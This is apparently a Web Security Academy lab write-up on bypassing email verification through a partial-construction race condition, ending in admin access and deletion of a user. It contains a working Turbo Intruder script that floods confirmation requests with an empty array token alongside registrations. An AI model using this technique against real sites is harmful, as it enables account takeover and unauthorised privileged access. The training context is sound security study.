---
title: "Lab 5 - Partial construction race conditions"
---

In this lab we are tasked with regsitering an account using arbitary email account (Associated with Admin) and then access the admin panel and delete the user account `carlos` and all this by exploiting the race conditon allowing us to bypass the email verification.

`Date: 4 September 2026`

## Table of Content 
1. [Initial Recon](#initial-recon)
2. [Exploitation](#exploitation)
3. [Conclusion](#conclusion)

## Initial Recon

When accessing the lab we can see we have an email client and functionality to register an account. 

![ab4e84f974258cb3af6e88c8b1170c90.png](/ab4e84f974258cb3af6e88c8b1170c90.png)

![2dfe4e10293cdbef5f6067271fc5b2c4.png](/2dfe4e10293cdbef5f6067271fc5b2c4.png)

The registeration page says that 
>If you work for GinAndJuice, please use your @ginandjuice.shop email address

Clearly Showing the domain for the email of the employee's accounts.

Let's first normally register an account with the email `wiener@exploit-0a9a00ef03dd7647801dac12011900d7.exploit-server.net`

![af06effe73c31257408ad1c3265675ce.png](/af06effe73c31257408ad1c3265675ce.png)

When I am trying to register the account it says invalid email address huh!!

Now try to register with any random email ending with `@ginandjuice.shop`

![edb52f6e09651c622ac56f596ad5bcec.png](/edb52f6e09651c622ac56f596ad5bcec.png)

It says email sucessfully sent so we can only send the email to the handle `@ginandjuice.shop` looks easy to exploit.

Once again we will register the account this time we will intercept the register request in burp and send to repeater.

![d42c1d9df8843b545f44dd6017e71b36.png](/d42c1d9df8843b545f44dd6017e71b36.png)

Now duplicate the request and change the email to your email handle which can be found in the email client.

![af6551eff3fe7e40e9233e2bc2e1ae34.png](/af6551eff3fe7e40e9233e2bc2e1ae34.png)

Group both the request and send the request in parallel.

It did not worked huh!

We need to find something else in this case after spending some time with the application I found this js file `user.js`

![67cc736ba92c13508394b70bed84b680.png](/67cc736ba92c13508394b70bed84b680.png)

The Intresting part of the code is -

```
const confirmEmail = () => {
    const container = document.getElementsByClassName('confirmation')[0];

    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;

    const button = document.createElement('button');
    button.className = 'button';
    button.type = 'submit';
    button.textContent = 'Confirm';

    form.appendChild(button);
    container.appendChild(form);
}

```

So what does part does it send a confirmation link to the registerted email account with the url formed `https://<portswigger>/confirm?token=<token>`

Let's test this out in the browser :

![Screenshot From 2026-09-03 19-39-35.png](/Screenshot%20From%202026-09-03%2019-39-35.png) 
![Screenshot From 2026-09-03 19-39-46.png](/Screenshot%20From%202026-09-03%2019-39-46.png)

Here what we can do is we can send the request of registration and in parallel this confirmation request when a race window opens in between register and send confirmation email we send the confirmation request with null value so registeration gets successfull.

## Exploitation 

Send the registration request to turbo intruder and set the attack script to `examples/race-single-packet-attack.py` and make the following modification so that token verification request is sent with each registration request :

```
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    token_req = '''
POST /confirm?token[]= HTTP/2
Host: 0ae2004904351780800058e7001e0001.web-security-academy.net
Cookie: phpsessionid=M4fhq10alpuJMj63EDiAj9IaDuvPFekW
Content-Length: 0
            '''
    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
   
    for i in range(40):
        username = "admin" + str(i)
        engine.queue(target.req,username, gate=str(i))
        for j in range(50):
            engine.queue(token_req,gate=str(i))
    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
        engine.openGate(str(i))


def handleResponse(req, interesting):
    table.add(req)
```



Filter by the length of content : 

![e6a5b3c0b55ff37a44369dd4825e652f.png](/e6a5b3c0b55ff37a44369dd4825e652f.png)

We can see out of 40 accounts 2 account registered successfully so now let's login with the creds :

```
admin39:peter
```

![b9e158152265b7e64489813c6cd35290.png](/b9e158152265b7e64489813c6cd35290.png)


We are now logged in and complete the task of deleting the user `carlos` :

![a48349993c9a477ccaad28a7c746a800.png](/a48349993c9a477ccaad28a7c746a800.png)

Whoop!! Challenge Solved 


## Conclusion

The application was vulnerable to a race condition in the email verification process. By sending the registration and confirmation requests concurrently with a NULL token, we were able to bypass email verification, register an account using the @ginandjuice.shop domain, access the admin panel, and delete the user carlos.
